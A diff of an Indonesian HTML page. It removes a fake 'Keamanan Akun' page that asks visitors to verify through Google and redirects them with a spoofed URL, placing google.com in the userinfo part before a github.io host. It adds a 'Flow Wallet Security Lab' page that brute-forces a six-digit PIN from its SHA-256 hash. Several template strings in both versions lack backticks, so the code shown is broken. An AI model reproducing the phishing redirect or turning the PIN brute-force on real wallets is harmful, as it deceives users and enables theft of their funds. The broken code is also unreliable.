@@ -1,39 +1,57 @@
-
-Anda mengirim
 <!DOCTYPE html>
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <title>Sistem Verifikasi Flow</title>
+    <title>Simulasi Brute-Force PIN SHA-256</title>
     <style>
-        body { font-family: sans-serif; text-align: center; background: #0b0e11; color: white; padding-top: 100px; }
-        .card { background: #1e2329; padding: 30px; border-radius: 15px; display: inline-block; border: 1px solid #474d57; }
-        .btn { background: #00ef8b; color: black; padding: 15px 25px; text-decoration: none; border-radius: 8px; font-weight: bold; display: inline-block; }
+        body { font-family: sans-serif; background: #0b0e11; color: white; padding: 20px; }
+        .card { background: #1e2329; padding: 20px; border-radius: 12px; border: 1px solid #474d57; }
+        #log { font-family: monospace; background: #000; padding: 10px; height: 200px; overflow-y: scroll; margin-top: 10px; color: #00ef8b; }
+        .btn { background: #00ef8b; padding: 10px 20px; border: none; cursor: pointer; font-weight: bold; }
     </style>
 </head>
 <body>
 
     <div class="card">
-        <h2>Keamanan Akun</h2>
-        <p>Akses ditangguhkan. Silakan verifikasi melalui Google untuk melanjutkan.</p>
-        <br>
-        <a id="spoofLink" href="#" class="btn">VERIFIKASI GOOGLE</a>
+        <h2>Flow Wallet Security Lab</h2>
+        <p>Target PIN: <strong>123456</strong> (Simulasi Hash SHA-256)</p>
+        <button class="btn" onclick="startBruteForce()">Mulai Serangan Brute-Force</button>
+        <div id="log"></div>
     </div>
 
     <script>
-        document.getElementById('spoofLink').onclick = function(e) {
-            e.preventDefault();
-            
-            const fakeDomain = "www.google.com";
-            const padding = "............................................................"; // Titik panjang
-            const realDomain = "0x403for.github.io"; // Ganti dengan domain Anda
-            
-            // Format: https://fake.com:padding@real.com
-            const spoofedUrl = https://${fakeDomain}:${padding}@${realDomain}/;
-            
-            window.location.href = spoofedUrl;
-        };
-    </script>
+        // Simulasi fungsi _hashPassword dari Fuelet
+        async function sha256(message) {
+            const msgBuffer = new TextEncoder().encode(message);
+            const hashBuffer = await crypto.subtle.digest('SHA-256', msgBuffer);
+            const hashArray = Array.from(new Uint8Array(hashBuffer));
+            return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
+        }
 
+        async function startBruteForce() {
+            const log = document.getElementById('log');
+            const targetHash = await sha256("123456"); // Hash PIN target
+            log.innerHTML += "Memulai serangan terhadap hash: " + targetHash + "<br>";
+
+            const startTime = performance.now();
+            
+            // Mencoba semua kombinasi 000000 - 999999
+            for (let i = 0; i <= 999999; i++) {
+                let guess = i.toString().padStart(6, '0');
+                let currentHash = await sha256(guess);
+
+                if (currentHash === targetHash) {
+                    const endTime = performance.now();
+                    log.innerHTML += <br><strong>DITEMUKAN!</strong> PIN: ${guess}<br>;
+                    log.innerHTML += Waktu eksekusi: ${((endTime - startTime) / 1000).toFixed(4)} detik.<br>;
+                    break;
+                }
+                
+                if (i % 50000 === 0) {
+                    log.innerHTML += Mencoba: ${guess}...<br>;
+                }
+            }
+        }
+    </script>
 </body>
 </html>
